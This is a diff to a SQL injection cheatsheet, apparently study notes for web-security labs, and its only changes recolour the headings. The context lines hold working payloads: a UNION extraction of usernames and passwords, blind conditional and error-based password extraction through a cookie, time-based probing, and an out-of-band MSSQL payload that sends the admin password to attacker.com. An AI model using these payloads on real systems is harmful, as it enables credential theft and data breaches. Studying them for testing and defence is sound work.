@@ -1,12 +1,12 @@
 # SQL injection
 
-## <mark style="color:yellow;">SQL Injection Cheatsheet</mark>
+## <mark style="color:purple;">SQL Injection Cheatsheet</mark>
 
 * [https://tib3rius.com/sqli](https://tib3rius.com/sqli)
 * [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
-## <mark style="color:yellow;">Overview</mark>
+## <mark style="color:purple;">Overview</mark>
 
 **How to detect SQLi vulnerabilities**
 
@@ -25,14 +25,14 @@
   * Oracle: every `SELECT` query must use the `FROM` keyword and specify a valid table
   * MySQL: the double-dash sequence must be followed by a space
 
-## <mark style="color:yellow;">SQL injection UNION attacks</mark>
+## <mark style="color:purple;">SQL injection UNION attacks</mark>
 
 Requirements:
 
 * The number of the columns returned by the original query
 * Columns from the original query must support data types for injected query results
 
-### <mark style="color:yellow;">Determining the number of columns required</mark>
+### <mark style="color:purple;">Determining the number of columns required</mark>
 
 **First way**: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)
 
@@ -57,7 +57,7 @@ Requirements:
 **Note**: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results
 {% endhint %}
 
-### <mark style="color:yellow;">Column data types</mark>
+### <mark style="color:purple;">Column data types</mark>
 
 Do you want a string?
 
@@ -70,7 +70,7 @@ Do you want a string?
 
 If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.
 
-### <mark style="color:yellow;">Examining database</mark>
+### <mark style="color:purple;">Examining database</mark>
 
 * `' UNION SELECT @@version--`
 * Most database types (except Oracle) have a set of views called the information schema
@@ -98,7 +98,7 @@ SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 SELECT COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS'
 ```
 
-### <mark style="color:yellow;">Retrieving multiple values within a single column</mark>
+### <mark style="color:purple;">Retrieving multiple values within a single column</mark>
 
 You can retrieve multiple values together within this single column by concatenating the values together.
 
@@ -106,11 +106,11 @@ You can retrieve multiple values together within this single column by concatena
 ' UNION SELECT username || '~' || password FROM users-- -
 ```
 
-## <mark style="color:yellow;">Blind SQLi</mark>
+## <mark style="color:purple;">Blind SQLi</mark>
 
 Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
 
-### <mark style="color:yellow;">Triggering conditional responses</mark>
+### <mark style="color:purple;">Triggering conditional responses</mark>
 
 **Detection**
 
@@ -135,7 +135,7 @@ See the response to confirm that the first character of the password is `s`
 
 We can continue this process to systematically extract data.
 
-### <mark style="color:yellow;">Error-based SQL injection</mark>
+### <mark style="color:purple;">Error-based SQL injection</mark>
 
 **Blind SQLi with conditional errors**
 
@@ -198,7 +198,7 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 * You can use the `CAST()` function to turns an otherwise blind SQL injection vulnerability into a visible one
 * `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
 
-### <mark style="color:yellow;">Time-based SQL injection</mark>
+### <mark style="color:purple;">Time-based SQL injection</mark>
 
 * Condition: As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response.
 * Triggering time delays depending on whether an injected condition is true or false
@@ -232,7 +232,7 @@ param=' AND 1337=(CASE WHEN ( (select substring(password,§1§,1) from users LIM
 
 </details>
 
-### <mark style="color:yellow;">Out-Of-Band (OAST) SQL injection</mark>
+### <mark style="color:purple;">Out-Of-Band (OAST) SQL injection</mark>
 
 An application might carry out a SQL query asynchronously (another thread execute the SQL query)
 
@@ -245,7 +245,7 @@ An application might carry out a SQL query asynchronously (another thread execut
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
 ```
 
-## <mark style="color:yellow;">Tips</mark>
+## <mark style="color:purple;">Tips</mark>
 
 * Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. **Check if there is a "default" \[error] response** or **Build a valid query** that provides a response indicating the parameter is vulnerable ... Example:
   * `/stockcheck?productID=1` and the response tell you 3 units (stock check)
@@ -259,7 +259,7 @@ An application might carry out a SQL query asynchronously (another thread execut
   * If there are some protection, try **XML encode**.
 * Use `— -`  insead of `--` . In many SQL systems, there must be at least one space after `--` for the comment to be recognised.
 
-## <mark style="color:yellow;">Automatic exploitation</mark>
+## <mark style="color:purple;">Automatic exploitation</mark>
 
 ```sh
 # SQL
